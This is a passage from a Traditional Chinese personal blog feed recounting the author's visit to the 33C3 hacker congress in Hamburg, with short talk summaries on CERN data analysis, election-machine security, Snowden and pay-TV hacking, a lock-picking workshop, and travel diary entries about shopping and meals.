然後重新配音，&lt;br /&gt;
There's no CCH, let's go back to 34C3 之類的，&lt;br /&gt;
之後出現 34C3 的標語是 Back to 34C3.  &lt;/p&gt;
&lt;p&gt;然後因為我們用來討論跟 33C3 有關的 Telegram 群組裏面，&lt;br /&gt;
有位 g0v 的 miaoski 來 33C3 給 talk，&lt;br /&gt;
因為他懂德文，&lt;br /&gt;
就幫忙翻譯一些到群組裏面讓我們知道台上在講啥，&lt;br /&gt;
所以這邊引用了他在群組裡給的翻譯。&lt;br /&gt;
（真是太感謝了，不然真的聽不懂德文。 QQ）  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;講一些今年的狀況，&lt;br /&gt;
衣服只剩下女生的 zipper size S and M 和 11/12 歲 Kids，&lt;br /&gt;
今年進了 7000 件衣服，&lt;br /&gt;
比去年多了 2000 件，&lt;br /&gt;
但還是第 2 天開賣後就賣光光。  &lt;/p&gt;
&lt;p&gt;喝掉 26000 公升的 Mate (Club Mate + Flora Mate)，&lt;br /&gt;
5000 KG 冰塊，&lt;br /&gt;
2500 個事先沒有報名的小天使（志工），&lt;br /&gt;
總工時 24300 hours，等於 4 天做了 13.76 年的工作量。&lt;br /&gt;
總共有 2500 個 DECT phone 註冊，去年是 2000 個。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;用 Gmail 信箱來報名 33C3 的會眾佔最多比例，&lt;br /&gt;
讓主辦單位很失望，&lt;br /&gt;
希望明年這個比例可以降低。&lt;br /&gt;
（Google 會分析使用者電子信箱中的信件內容，&lt;br /&gt;
用於個人化廣告投放的受眾基準或是 Google Calendar 的「貼心」提醒，&lt;br /&gt;
所以他們很討厭這種會蒐集使用者大量資料的公司，&lt;br /&gt;
因為只要政府一下令，&lt;br /&gt;
這些公司通常都會配合並交出使用者的個人資料。）  &lt;/p&gt;
&lt;p&gt;最後還用液態氮+裝水的水桶+球池用的塑膠球表演小型煙火，&lt;br /&gt;
實在是太狂了 XD  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Liquid Nitrogen Fireworks" src="/files/33c3/liquid-nitrogen-fireworks.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;之後就是放一些會議的照片做總結，&lt;br /&gt;
當然因為重視隱私的關係，&lt;br /&gt;
官方自己也沒有攝影組拍攝大量會眾的照片，&lt;br /&gt;
不像台灣的 conf 基本上都會放很多會眾的照片，&lt;br /&gt;
拍攝前和放上去前可能也沒有問過當事人的意願之類的，&lt;br /&gt;
一切就是回歸會議的本質，&lt;br /&gt;
靠著主持人的口才來總結一下整個會議的一些大小事，&lt;br /&gt;
只會有一些少數會眾的照片，&lt;br /&gt;
通常是主持人自己、工作人員或是自己的小孩，&lt;br /&gt;
會眾的部份只有一張，&lt;br /&gt;
就是排隊買衣服的時候，&lt;br /&gt;
而且只有拍背影，&lt;br /&gt;
覺得這是比較不一樣的地方。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/30/33c3-5"&gt;33C3 (5)&lt;/a&gt;  &lt;/p&gt;</summary><category term="33C3"></category><category term="Chaos Communication Congress"></category><category term="CCC"></category></entry><entry><title>33c3 (3)</title><link href="https://blog.m157q.tw/posts/2016/12/29/33c3-3/" rel="alternate"></link><published>2017-02-04T20:46:07+08:00</published><updated>2017-02-04T20:46:07+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-29:posts/2016/12/29/33c3-3/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/28/33c3-2"&gt;33C3 (2)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;33C3 Day 3 (2016.12.29 Thu)&lt;/h2&gt;
&lt;p&gt;下午才到 CCH，&lt;br /&gt;
先到 Hall G 聽了&lt;a href="https://media.ccc.de/v/33c3-8088-lightning_talks_day_3"&gt;幾場 Day 3 的 Lightning Talk&lt;/a&gt;，&lt;br /&gt;
CCC 的 Lightning talk 是要事先報名的，&lt;br /&gt;
每場一樣是 5 分鐘，&lt;br /&gt;
旁邊會有個綠綠的燈柱計時，&lt;br /&gt;
有些是講這一年做了什麼事，例如：HackerSpace 建立了 5 年後的狀況。&lt;br /&gt;
有些事講現在和之後預計做什麼，然後來找同伴一起做，例如：有個女生講說她想要對專利權的部份建立起類似像 GitHub 那樣的平台。&lt;br /&gt;
有些則是來宣傳 Assembly 的 Workshop，例如：有個直接在台上講解為什麼數據機和傳真機都會有那種聲音的原因，講的挺清楚的，還搭配圖解，然後請有興趣的人到他們攤位聊聊。&lt;br /&gt;
有些則是講述自己國家跟資訊相關的一些現象或活動，例如：e-voting 的一些狀況。&lt;br /&gt;
Lightning talk 似乎不開放現場報名就是，&lt;br /&gt;
然後每天都有幾場 Lighting talk 這樣。  &lt;/p&gt;
&lt;p&gt;之後到 Hall 2 去聽&lt;a href="https://media.ccc.de/v/33c3-8369-machine_dreams"&gt;一場題目為 "Machine Dreams" 的演講&lt;/a&gt;，&lt;br /&gt;
人真的超級多，多到我太慢進去就沒地方坐，只能站著，&lt;br /&gt;
看來標題簡單的議程不管到哪都會吸引很多人啊。&lt;br /&gt;
一開始就講影視裏面提到的 AI，&lt;br /&gt;
例如：Ex Machina, Westworld&lt;br /&gt;
後來覺得講的有點水，&lt;br /&gt;
然後剛好又被工作人員說人滿了沒位置坐的人不要站著，&lt;br /&gt;
所以我就走出去哩。  &lt;/p&gt;
&lt;p&gt;今天其實有點累，&lt;br /&gt;
而且看了一下沒有什麼自己特別想聽的議程，&lt;br /&gt;
所以今天大概就是這樣吧，&lt;br /&gt;
剩下的時間都在會場閒晃和整理文章。  &lt;/p&gt;
&lt;p&gt;附上一些拍到的有趣照片，&lt;br /&gt;
基本上都是些像我這種阿宅會覺得有趣的東西：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img alt="Control Alt Delete" src="/files/33c3/control-alt-delete.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="xkcd" src="/files/33c3/xkcd.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Social Engineering" src="/files/33c3/social-engineering.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/30/33c3-4"&gt;33C3 (4)&lt;/a&gt;  &lt;/p&gt;</summary><category term="33C3"></category><category term="Chaos Communication Congress"></category><category term="CCC"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (10)</title><link href="https://blog.m157q.tw/posts/2016/12/29/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-10/" rel="alternate"></link><published>2017-01-15T01:02:59+08:00</published><updated>2017-01-15T01:02:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-29:posts/2016/12/29/33c3-暨歐洲法荷德聖誕跨年遊-10/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/28/33c3-暨歐洲法荷德聖誕跨年遊-9"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (9)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 10 2016/12/29 Thu&lt;/h2&gt;
&lt;p&gt;有關 CCC 的簡介請參考：&lt;a href="/posts/2016/12/27/33c3-0"&gt;33C3 intro&lt;/a&gt;&lt;br /&gt;
有關本日 CCC 議程相關紀錄請參閱：&lt;a href="/posts/2016/12/29/33c3-day3"&gt;33C3 Day 3&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;早上一夥人去 ROSSMANN 買了發泡錠，&lt;br /&gt;
一管 20 片只要 0.45 歐，&lt;br /&gt;
真的有夠便宜，&lt;br /&gt;
於是就買了六管綜合維他命。  &lt;/p&gt;
&lt;p&gt;之後又去 REWE 超市逛，&lt;br /&gt;
順手買了瓶 Ja! 牛奶來喝，&lt;br /&gt;
全脂 1 公升裝只要 0.65 歐，&lt;br /&gt;
脫脂 1 公升裝只要 0.6 歐，&lt;br /&gt;
折合新台幣約 20 塊左右，&lt;br /&gt;
比在荷蘭看到的還便宜！&lt;br /&gt;
在台灣買個義美鮮乳 1 公升裝就要新台幣 88 元，&lt;br /&gt;
害我這個超愛喝牛奶的人都不能忘情得喝，&lt;br /&gt;
但在這裡是真的可以把牛奶當水喝的啊！  &lt;/p&gt;
&lt;p&gt;之後又去煙店買了可以通鼻子用的鼻煙，&lt;br /&gt;
聽說有尼古丁的成份，&lt;br /&gt;
因為前幾天同行的朋友說他之前在德國買的這個用來通鼻塞很有用，&lt;br /&gt;
用了以後真的挺有用的，&lt;br /&gt;
而且還挺便宜的，&lt;br /&gt;
10 公克一盒，&lt;br /&gt;
只要 2 歐元，&lt;br /&gt;
只是使用方法真的很像在吸白粉...  &lt;/p&gt;
&lt;p&gt;之後我因為嚴重便祕第二天實在是受不了了，&lt;br /&gt;
所以又去漢堡車站的 Edeka Tamme 買生菜沙拉，&lt;br /&gt;
這邊的生菜沙拉是用秤重計價的，&lt;br /&gt;
100 公克要 1.19 歐，&lt;br /&gt;
每個地方的價錢似乎不太一樣，&lt;br /&gt;
車站好像比較貴一點，&lt;br /&gt;
同行的朋友有在其他地方買過 100 公克 1 歐的。&lt;br /&gt;
生菜沙拉的料自己夾，&lt;br /&gt;
種類還滿多樣的，&lt;br /&gt;
有肉、有蛋、有起司、有甜點、有蔬菜、有水果、有米飯，簡直就是自助餐了。&lt;br /&gt;
重點是秤重的時候不是什麼不滿 100 公克以 100 公克計算，&lt;br /&gt;
而是多重就算多少，&lt;br /&gt;
我買了 436 克，&lt;br /&gt;
所以收據上就是寫 5.18 歐，&lt;br /&gt;
而且收銀機那邊就可以直接秤重，&lt;br /&gt;
真的很酷，&lt;br /&gt;
不用再另外拿個磅秤啥的。&lt;br /&gt;
最後吃的時候覺得真的是我目前到德國吃到的便宜食物裏面最好吃的了。&lt;br /&gt;
（痛哭，我真的不想再便祕啦，真的會讓人心情很差，而且還會不想上大號。）  &lt;/p&gt;
&lt;p&gt;之後就前往 CCC 的會場。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/30/33c3-暨歐洲法荷德聖誕跨年遊-11"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (11)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Hamburg"></category></entry><entry><title>33c3 (2)</title><link href="https://blog.m157q.tw/posts/2016/12/28/33c3-2/" rel="alternate"></link><published>2017-02-04T20:45:07+08:00</published><updated>2017-02-04T20:45:07+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-28:posts/2016/12/28/33c3-2/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/27/33c3-1"&gt;33C3 (1)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;33C3 Day 2 (2016.12.28 Wed)&lt;/h2&gt;
&lt;h3&gt;How physicists analyze massive data: LHC + brain + ROOT = Higgs&lt;/h3&gt;
&lt;p&gt;Axel Naumann, CERN - axel@cern.ch  &lt;/p&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-8083-how_physicists_analyze_massive_data_lhc_brain_root_higgs"&gt;https://media.ccc.de/v/33c3-8083-how_physicists_analyze_massive_data_lhc_brain_root_higgs&lt;/a&gt;  &lt;/p&gt;
&lt;h4&gt;CERN&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;European Organization for Nuclear Research, est. 1954, near Geneva  &lt;/li&gt;
&lt;li&gt;What is mass? What's in the universe? Probing smallest scale particles: Higgs particle, super symmetry, ...  &lt;/li&gt;
&lt;li&gt;Fact sheet  &lt;ul&gt;
&lt;li&gt;12,000 physicists  &lt;/li&gt;
&lt;li&gt;from 120 nations  &lt;/li&gt;
&lt;li&gt;CERN itself has about 2500 employees  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LHC (Large Hadron Collider)  &lt;ul&gt;
&lt;li&gt;All build by physicists in CERN  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;You cannnot just by the gears on Amazon  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Life (Work) at CERN  &lt;ul&gt;
&lt;li&gt;More laptops than people  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;What we do in CERN&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Theory and Simulation  &lt;ul&gt;
&lt;li&gt;Super super precise  &lt;/li&gt;
&lt;li&gt;But LHC experiments also looking for unconfirmed / weird things  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Prediction versus Measurement  &lt;ul&gt;
&lt;li&gt;When is a difference between "boring theory" and measurment.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Weather vs Climate  &lt;ul&gt;
&lt;li&gt;Measure temperatures  &lt;/li&gt;
&lt;li&gt;Detect "abnormal" temperature variations  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data and Uncertainties  &lt;ul&gt;
&lt;li&gt;Our simulation has uncertainties from theory  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;More Data Helps  &lt;ul&gt;
&lt;li&gt;Correlating data helps  &lt;/li&gt;
&lt;li&gt;Reduced measurement uncertainty helps  &lt;/li&gt;
&lt;li&gt;more collisions = more data = higher changce to claim "we see something"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Computers&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;CPU Efficiency (CMS)  &lt;ul&gt;
&lt;li&gt;Average 750%  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;100% is for beginners  XD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Measure effect of bugs&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Why not HDFS / HDF5 / Protobuf / ...  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Cling, C++ interpreter of CERN  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;What we used in CERN  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Davix  &lt;/li&gt;
&lt;li&gt;CernVM-FS  &lt;/li&gt;
&lt;li&gt;ROOT  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Data analysis in CERN&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;C++  &lt;/li&gt;
&lt;li&gt;ROOT  &lt;ul&gt;
&lt;li&gt;http://root.cern  &lt;/li&gt;
&lt;li&gt;Serialization facilities  &lt;/li&gt;
&lt;li&gt;Statistics tools  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這場的講者用掌聲的熱烈程度讓觀眾選擇要聽哪兩個部份，&lt;br /&gt;
其實還挺誘答的，每次都是後者。&lt;br /&gt;
總之就是在向大家介紹 CERN 在做什麼，然後找人進去做軟體。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;T-shirts (20 EUR), Hoodie (35 EUR), Zipper (45 EUR) 大概下午一點多開賣，&lt;br /&gt;
排隊的人超級多，果然世界各地的宅宅都會掉 Conference T-shirt 的坑。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Gone in 60 milliseconds&lt;/h3&gt;
&lt;p&gt;Richard Jones  &lt;/p&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-7865-gone_in_60_milliseconds"&gt;https://media.ccc.de/v/33c3-7865-gone_in_60_milliseconds&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;第一次看到英文的簡報用高橋流，搭配一些程式碼的截圖，感覺效果挺不錯的。&lt;br /&gt;
詳細的講解怎麼攻擊 AWS Lambda 的思路，挺精彩的，但沒有現場 Live demo 就是。&lt;br /&gt;
因為用高橋流講的很快，英打速度不夠快，加上我對 AWS 不夠熟，所以就不做筆記哩，看之後投影片會不會釋出吧。  &lt;/p&gt;
&lt;p&gt;講者在演講後會釋出 &lt;a href="https://github.com/Miserlou/mackenzie"&gt;AWS Infection Toolkit on GitHub (Miserlou/mackenzie)&lt;/a&gt;，&lt;br /&gt;
但根據&lt;a href="https://github.com/Miserlou/Mackenzie/issues/1#issuecomment-269494748"&gt;這個 Issue 的回覆&lt;/a&gt;看來，&lt;br /&gt;
講者要等對這個 toolkit 寫完測試後才會 push 到 GitHub 上。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Recount 2016: An uninvited security audit of the U.S. presidential election&lt;/h3&gt;
&lt;p&gt;J. Alex Halderman, Matthew Bernhard, University of Michigan  &lt;/p&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-8074-recount_2016_an_uninvited_security_audit_of_the_u_s_presidential_election"&gt;https://media.ccc.de/v/33c3-8074-recount_2016_an_uninvited_security_audit_of_the_u_s_presidential_election&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2 styles, 52 models of voting machines  &lt;ul&gt;
&lt;li&gt;styles  &lt;ul&gt;
&lt;li&gt;Optical Scan  &lt;ul&gt;
&lt;li&gt;Computer counts paper balots as they're placed in ballot box  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DRE (Direct Recording Electronic)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Long, Complicated Ballots  &lt;/li&gt;
&lt;li&gt;Reverse engineering the voting machines  &lt;ul&gt;
&lt;li&gt;Used movable memory card, could be installed malware on the machines  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Are U.S. Voting Machines Secure?  &lt;ul&gt;
&lt;li&gt;Hart InterCivic eSlate, AVC Advantage, Sequoia AVC Edge, ... lots of card spread malwares  &lt;/li&gt;
&lt;li&gt;Vulnerabilities for malware to stealing the vote result.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Election Hacking  &lt;ul&gt;
&lt;li&gt;Alter election-night results  &lt;/li&gt;
&lt;li&gt;Denial of service  &lt;/li&gt;
&lt;li&gt;Political interfeerence  &lt;/li&gt;
&lt;li&gt;Challenges  &lt;ul&gt;
&lt;li&gt;Need to swap &amp;lt;1% of votes in two states  &lt;/li&gt;
&lt;li&gt;Machines aren't no connect with internet  &lt;ul&gt;
&lt;li&gt;But use centralized election management computers  &lt;/li&gt;
&lt;li&gt;Centralized election management computer programs ballots are dd into memory card before the election  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Hakcing a U.S. election machines is much more easier than you thought.  &lt;/li&gt;
&lt;li&gt;Will we ever be able to confirm outcome was correct?  &lt;/li&gt;
&lt;li&gt;Jill stein, 2016 Green Party U.S. presidential election candidates willing to help to demand a recount. (Any candidates can demand a recount if they pay the cost.)  &lt;ul&gt;
&lt;li&gt;How to pay for the recount? =&amp;gt; Crowd funding  &lt;/li&gt;
&lt;li&gt;Where to recount? =&amp;gt; Wisconsin, Michigan, Pennsylvania  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主要就是在講美國 2016 大選的問題，&lt;br /&gt;
探討投票機是不是有可能被動手腳，&lt;br /&gt;
以及講者參與要求重新計票的過程。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;3 Years After Snowden: Is Germany fighting state surveillance?&lt;/h3&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-8117-3_years_after_snowden_is_germany_fighting_state_surveillance"&gt;https://media.ccc.de/v/33c3-8117-3_years_after_snowden_is_germany_fighting_state_surveillance&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;主要就是講述自從 3 年前 Snowden 從香港逃出後到現在，&lt;br /&gt;
德國的爭取網路隱私權的一些狀況。  &lt;/p&gt;
&lt;p&gt;重點是這場 session 最後出現的神祕嘉賓，&lt;br /&gt;
Snowden 本人現場連線和大家說話，&lt;br /&gt;
全場為之瘋狂，&lt;br /&gt;
出現和結束連線的時候大家都起立鼓掌了好久。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Snowden in 33C3" src="/files/33c3/snowden.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;The untold story of Edward Snowden's Escape from Hong Kong&lt;/h3&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-8416-the_untold_story_of_edward_snowden_s_escape_from_hong_kong"&gt;https://media.ccc.de/v/33c3-8416-the_untold_story_of_edward_snowden_s_escape_from_hong_kong&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;2013 年幫助史諾登逃出香港的人們&lt;br /&gt;
（被稱為 Snowden's Guardians，大多數是難民，因為覺得史諾登的處境跟他們很像所以幫忙他），&lt;br /&gt;
至今的處境仍然和三年前一樣悲慘，&lt;br /&gt;
仍然居住在一樣狹小的空間，&lt;br /&gt;
因為香港政府不讓難民在香港取得工作權，&lt;br /&gt;
其子女在香港也拿不到國籍，&lt;br /&gt;
成為 Stateless 的無國家遊民，&lt;br /&gt;
所以希望可以透過群眾募資幫忙這些人，&lt;br /&gt;
結果香港政府發現以後，&lt;br /&gt;
把群眾募資的網站關閉，&lt;br /&gt;
所以這場 talk 主要就是請大家把這兩個群眾募資的連結散佈出去，&lt;br /&gt;
讓更多人可以幫助他們。  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://www.gofundme.com/snowdenguardians"&gt;https://www.gofundme.com/snowdenguardians&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://fundrazr.com/snowdensguardians"&gt;https://fundrazr.com/snowdensguardians&lt;/a&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;然後用 Skype 現場連線當初幫忙庇護 Snowden 的 Guardians 之一：菲律賓籍的 Vanessa，&lt;br /&gt;
講述她遇到 Snowden 的過程，&lt;br /&gt;
一個白人男子來敲她的門想尋求住處，&lt;br /&gt;
但她的住處只有一張床，&lt;br /&gt;
她把床讓給 Snowden 睡，&lt;br /&gt;
自己則睡地板上。&lt;br /&gt;
隔天早上，Snowden 請她幫忙買一份英文報紙，&lt;br /&gt;
她才知道原來這個人是全球頭號通緝犯，&lt;br /&gt;
但她仍然因為 Snowden 的危險處境而幫忙他，&lt;br /&gt;
直到他逃離香港，期間還和家人一起慶祝 Snowden 30 歲生日，並一起吃生日蛋糕。  &lt;/p&gt;
&lt;p&gt;現場有會眾問她「如果再讓妳選一次，妳會幫忙 Snowden 嗎？」&lt;br /&gt;
她只簡短的回答一句「Yes。」&lt;br /&gt;
全場觀眾立刻爆出如雷的掌聲。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/29/33c3-3"&gt;33C3 (3)&lt;/a&gt;  &lt;/p&gt;</summary><category term="33C3"></category><category term="Chaos Communication Congress"></category><category term="CCC"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (9)</title><link href="https://blog.m157q.tw/posts/2016/12/28/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-9/" rel="alternate"></link><published>2017-01-15T00:59:59+08:00</published><updated>2017-01-15T00:59:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-28:posts/2016/12/28/33c3-暨歐洲法荷德聖誕跨年遊-9/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/27/33c3-暨歐洲法荷德聖誕跨年遊-8"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (8)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 9 2016/12/28 Wed&lt;/h2&gt;
&lt;p&gt;有關 CCC 的簡介請參考：&lt;a href="/posts/2016/12/27/33c3-0"&gt;33C3 intro&lt;/a&gt;&lt;br /&gt;
有關本日 CCC 議程相關紀錄請參閱：&lt;a href="/posts/2016/12/28/33c3-day2"&gt;33C3 Day 2&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;因為凌晨才回來，&lt;br /&gt;
所以大家都睡的有點晚。&lt;br /&gt;
在漢堡車站買了兩個單價只要 0.6 歐的超大牛角麵包當早午餐後，&lt;br /&gt;
（雖然沒有巴黎要價 1.2 歐的牛角麵包好吃就是，但我本來就只是要果腹用的）&lt;br /&gt;
就搭地鐵前往 CCH。  &lt;/p&gt;
&lt;p&gt;午餐則是出來到 CCH 旁的車站看有啥好吃的，&lt;br /&gt;
因為這幾天已經受夠吃冷冰冰的食物了，&lt;br /&gt;
（基本上歐洲便宜的食物不是亞洲人賣的話都是冷的）&lt;br /&gt;
所以就買了個 asiahung 的炸雞塊炒麵吃吃看，&lt;br /&gt;
要價 4.9 歐，&lt;br /&gt;
雖然麵有點硬，&lt;br /&gt;
但至少是熱的就是。  &lt;/p&gt;
&lt;p&gt;直到大概晚上九點多，&lt;br /&gt;
因為累了，&lt;br /&gt;
就提早走著跟昨天一樣的路回去旅館睡覺。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/29/33c3-暨歐洲法荷德聖誕跨年遊-10"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (10)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Hamburg"></category></entry><entry><title>33c3 (1)</title><link href="https://blog.m157q.tw/posts/2016/12/27/33c3-1/" rel="alternate"></link><published>2017-02-04T20:45:07+08:00</published><updated>2017-02-04T20:45:07+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-27:posts/2016/12/27/33c3-1/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/27/33c3-0"&gt;33C3 intro&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;33C3 Day 1 (2016.12.27 Tue)&lt;/h2&gt;
&lt;h3&gt;Opening&lt;/h3&gt;
&lt;p&gt;約 15 分鐘的開場，&lt;br /&gt;
有興趣的人可以直接看這個影片：&lt;a href="https://media.ccc.de/v/33c3-8429-33c3_opening_ceremony"&gt;https://media.ccc.de/v/33c3-8429-33c3_opening_ceremony&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Opening" src="/files/33c3/opening.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;How do I crack satellite and Cable Pay TV&lt;/h3&gt;
&lt;p&gt;講者很屌得直接 reverse engineering 一台機上盒，&lt;br /&gt;
噢不，講一台好像不是很精確，&lt;br /&gt;
因為講者最後放了張照片，&lt;br /&gt;
他的小貨車後車廂放滿了好幾台這機器。&lt;br /&gt;
期間花了許多時間，&lt;br /&gt;
到完全瞭解機上盒的電路板每個元件到底在做哪些事情，&lt;br /&gt;
最後自己重新焊接電路板上的線路達到目的，&lt;br /&gt;
可以不用付錢直接爽爽看，&lt;br /&gt;
非常精彩。  &lt;/p&gt;
&lt;p&gt;影片在此：&lt;a href="https://media.ccc.de/v/33c3-8127-how_do_i_crack_satellite_and_cable_pay_tv"&gt;https://media.ccc.de/v/33c3-8127-how_do_i_crack_satellite_and_cable_pay_tv&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Lock Picking Workshop&lt;/h3&gt;
&lt;p&gt;&lt;img alt="lock picking workshop poster" src="/files/33c3/lock-picking-workshop.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;身為一個 Hacker，&lt;br /&gt;
其中一項必備技能就是開鎖(Lock Picking)，&lt;br /&gt;
想知道緣由的人可以參考&lt;a href="http://www.books.com.tw/products/0010548392"&gt;博客來-黑客列傳：電腦革命俠客誌(25週年紀念版)&lt;/a&gt;。&lt;br /&gt;
主要就是早期可以用電腦的機會非常少，&lt;br /&gt;
放電腦的機房晚上又會上鎖沒人用，&lt;br /&gt;
一群熱愛電腦的駭客覺得這樣很浪費，&lt;br /&gt;
於是自學開鎖技能把上鎖的機房打開，&lt;br /&gt;
進去裏面偷用電腦。  &lt;/p&gt;
&lt;p&gt;參加之前就有耳聞 CCC 有一個 Lock Picking 的 workshop，&lt;br /&gt;
可以讓你現場練習如何開鎖，&lt;br /&gt;
一直想要瞧瞧看，&lt;br /&gt;
所以聽完第一場演講後就跑來參加了。  &lt;/p&gt;
&lt;p&gt;位置不多，&lt;br /&gt;
但想要參加的人挺多的，&lt;br /&gt;
所以排隊排了一下才等到有位置可以坐。&lt;br /&gt;
現場會有人做簡單的教學，&lt;br /&gt;
拿透明的鎖頭講解鎖頭的基本原理並示範基本的 Raking 跟 Picking 開鎖技巧，&lt;br /&gt;
這些其實在 youtube 搜尋一下就有了，&lt;br /&gt;
但難是難在自己實際操作，&lt;br /&gt;
根據現場教學的人的說法是：「基本上不是用看的，比較像是用聽的和靠感覺的。」  &lt;/p&gt;
